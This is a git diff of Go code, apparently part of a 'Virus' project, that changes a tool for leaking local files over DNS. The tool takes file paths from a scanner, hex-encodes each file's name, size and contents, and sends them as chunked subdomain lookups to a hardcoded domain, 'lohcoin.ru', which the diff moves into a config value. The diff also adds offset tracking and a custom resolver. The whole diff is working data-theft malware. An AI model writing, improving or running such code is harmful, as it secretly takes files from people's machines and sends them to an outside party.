@@ -9,20 +9,20 @@ import (
 	"sync"
 	"log"
 	"bytes"
-	"InfoSec/Virus/Scaner"
+	"InfoSec/Virus/Scanner"
+	"strconv"
+	"InfoSec/Params"
+	"context"
 )
 
-const url = "lohcoin.ru"
-const bufSize = 31
-const maxSubdomainLength = 63
 
-// WG is wait group to synchronize the pool and the main routines
+// WG is wait group to synchronize the pool and the main routine
 var Wg sync.WaitGroup
 
 // Scan reads file paths from channel and sends it
 func Scan() {
 	Wg.Add(1)
-	for file := range Scaner.FileNames {
+	for file := range Scanner.FileNames {
 		SendFile(file)
 	}
 	Wg.Done()
@@ -30,8 +30,8 @@ func Scan() {
 
 // SendFile opens file and sends in particular format
 func SendFile(path string) error {
-	buffer := make([]byte, bufSize)
-	file, err := os.OpenFile(path, os.O_RDONLY, 0600)
+	buffer := make([]byte, Params.BufSize)
+	file, err := os.Open(path)
 	if err != nil {
 		return err
 	}
@@ -40,30 +40,39 @@ func SendFile(path string) error {
 	prefix := sha3.Sum224([]byte(path))
 
 	filename := info.Name()
-	if len(filename) > maxSubdomainLength {
+	size := strconv.FormatInt(info.Size(), 10)
+	if len(filename) > Params.MaxSubdomainLength / 2 {
 		len := len(filename)
-		filename = filename[len - maxSubdomainLength: len]
-		log.Println(filename)
+		filename = filename[len - Params.MaxSubdomainLength / 2 : len]
 	}
 
-	resolve(hex.EncodeToString([]byte(filename)), prefix, 0)
+	filename = hex.EncodeToString([]byte(filename))
+	size = hex.EncodeToString([]byte(size))
+	filename = fmt.Sprintf("%s.%s", filename, size)
+	resolve(filename, prefix, 0)
 
-	for i := uint64(1);; i++ {
-		n, _ := file.Read(buffer)
+	for i := int64(1);; {
+		n, err := file.Read(buffer)
 		encoded := hex.EncodeToString(buffer[:n])
+		encoded = insertNth(encoded, Params.MaxSubdomainLength, '.')
 		resolve(encoded, prefix, i)
-		if n < bufSize {
+		i += int64(n)
+		if n < Params.BufSize || err != nil {
 			break
 		}
 	}
 	return nil
 }
 
-
 // resolve: forms host and resolves it
-func resolve(content string, prefix [28]byte, part uint64) {
-	host := fmt.Sprintf("%x.%063x.%s.%s", prefix, part, content, url)
-	_, err := net.LookupHost(host)
+func resolve(content string, prefix [28]byte, offset int64) {
+	Resolver := &net.Resolver{
+		PreferGo: Params.PreferGoResolver,
+		StrictErrors: true,
+	}
+	host := fmt.Sprintf("%x.%019x.%s.%s", prefix, offset, content, Params.URL)
+	fmt.Printf("2017-11-12 14:22:41 %s.\n", host)
+	_, err := Resolver.LookupHost(context.Background(), host)
 	if err != nil {
 		log.Println(err)
 	}
